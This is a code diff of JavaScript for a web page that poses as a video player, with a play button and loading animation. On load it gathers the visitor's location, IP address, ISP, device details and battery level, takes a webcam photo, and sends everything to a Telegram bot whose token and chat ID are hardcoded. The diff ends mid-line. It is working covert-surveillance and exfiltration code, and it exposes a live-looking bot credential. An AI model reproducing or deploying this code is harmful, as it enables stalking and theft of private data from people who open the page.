@@ -1,71 +1,56 @@
-const BOT_TOKEN = "YOUR_BOT_TOKEN";
-const CHAT_ID = "YOUR_CHAT_ID";
+const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o";
+const CHAT_ID = "-1002270270494";
 
-function sendToTelegram(photo, message) {
-    let formData = new FormData();
+function sendToTelegram(message, photoBlob = null) {
+    const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("photo", photo);
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    formData.append("caption", message);
+    if (photoBlob) {
+        formData.append("photo", photoBlob, "snapshot.jpg");
+    }
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: "POST",
         body: formData
-    }).then(() => {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-        });
     });
 }
 
-function captureData() {
-    navigator.geolocation.getCurrentPosition(
-        position => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            let userData = `📍 Lokasi: ${lat}, ${lon}\n`;
+async function captureData() {
+    let message = "🔍 Data Pengguna:\n";
 
-            fetch("https://ipinfo.io/json")
-                .then(response => response.json())
-                .then(data => {
-                    userData += `🌍 Kota: ${data.city}, ${data.region}\n`;
-                    userData += `🌐 IP: ${data.ip}\nISP: ${data.org}\n`;
+    try {
+        const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        message += `📍 Lokasi: ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
+    } catch {
+        message += "❌ Lokasi tidak diizinkan.\n";
+    }
 
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(stream => {
-                            let video = document.createElement("video");
-                            video.srcObject = stream;
-                            video.play();
+    try {
+        const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+        message += `🌐 IP: ${ipData.ip}\n🏙 Kota: ${ipData.city}, ${ipData.region}\n📡 ISP: ${ipData.org}\n`;
+    } catch {
+        message += "⚠️ Gagal mendapatkan informasi IP.\n";
+    }
 
-                            let canvas = document.createElement("canvas");
-                            let ctx = canvas.getContext("2d");
+    let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
+    let androidVersion = navigator.userAgent.match(/Android\s([0-9\.]+)/);
+    let androidInfo = androidVersion ? `🤖 Android: ${androidVersion[1]}\n` : "";
 
-                            setTimeout(() => {
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                canvas.toBlob(blob => {
-                                    sendToTelegram(blob, userData);
-                                }, "image/png");
+    message += `📱 Perangkat: ${navigator.userAgent}\n📶 Jaringan: ${network}\n${androidInfo}`;
 
-                                stream.getTracks().forEach(track => track.stop());
-                            }, 2000);
-                        })
-                        .catch(() => sendToTelegram(null, userData + "❌ Kamera tidak diizinkan."));
-                });
-        },
-        () => sendToTelegram(null, "❌ Lokasi tidak diizinkan.")
-    );
-}
+    try {
+        const battery = await navigator.getBattery();
+        message += `🔋 Baterai: ${Math.round(battery.level * 100)}%\n`;
+    } catch {
+        message += "⚠️ Tidak bisa mendapatkan status baterai.\n";
+    }
 
-window.onload = () => {
-    captureData();
-
-    setTimeout(() => {
-        document.querySelector(".play-button").style.display = "none";
-        document.querySelector(".loading-animation").style.display = "block";
-
-        setTimeout(() => {
-            document.querySelector(".loading-animation").style.display = "none";
-            document.querySelector(".progress").style.width = "100%";
-        }, 1500);
-    }, 1000);
-};
+    try {
+        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        let track = stream.getVideoTracks()[0];
+        let imageCapture = new ImageCapture(track);
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        const blob = await imageCapture.takePhoto();
+        await sendToTelegram(message, blob);
+        stream.get
